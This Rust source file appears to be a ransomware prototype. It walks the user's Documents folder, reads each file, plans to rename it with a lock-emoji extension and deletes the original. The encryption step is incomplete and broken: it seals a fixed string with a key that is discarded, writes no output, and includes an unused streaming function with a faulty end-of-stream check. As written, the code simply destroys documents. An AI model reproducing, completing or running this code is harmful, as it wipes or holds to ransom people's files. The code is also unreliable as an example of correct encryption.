use dirs::home_dir;
use orion::aead::streaming::{StreamSealer, StreamTag};
use std::fs;
use std::path::PathBuf;
use std::io::prelude::*;
use anyhow::Result;
use orion::aead;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const CHUNK_SIZE:			usize	= 128;

fn main() -> Result<()> {
	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy()
	);
	println!("{}", target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path)?;
		}
	}

	Ok(())
}

fn encrypt_stream(src: &[u8]) -> Result<Vec<Vec<u8>>> {
	let mut out: Vec<Vec<u8>> = Vec::with_capacity(4096 / 128);

	// https://docs.rs/orion/0.17.4/orion/aead/streaming/index.html
	let (mut sealer, nonce) = StreamSealer::new(&generate_key())?;

	for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
		let encrypted_chunk =
			if src_chunk.len() != CHUNK_SIZE || n_chunk + 1 == src.len() / CHUNK_SIZE {
				// We've reached the end of the input source,
				// so we mark it with the Finish tag.
				sealer.seal_chunk(src_chunk, &StreamTag::Finish)?
			} else {
				// Just a normal chunk
				sealer.seal_chunk(src_chunk, &StreamTag::Message)?
			};
		// Save the encrypted chunk somewhere
		out.push(encrypted_chunk);
	}

	Ok(out)
}

fn encrypt_file(path: PathBuf) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let mut file = fs::File::open(&path)?;
	
		let mut contents = Vec::new();
		file.read_to_end(&mut contents)?;

		let encrypted_path = PathBuf::from(
			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
		);

		fs::remove_file(&path)?;

		let secret_key = aead::SecretKey::generate(256)?;
		let ciphertext = aead::seal(&secret_key, b"Secret message")?;
		//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
	}

	Ok(())
}

fn generate_key() -> aead::SecretKey {
	aead::SecretKey::generate(256).unwrap()
}
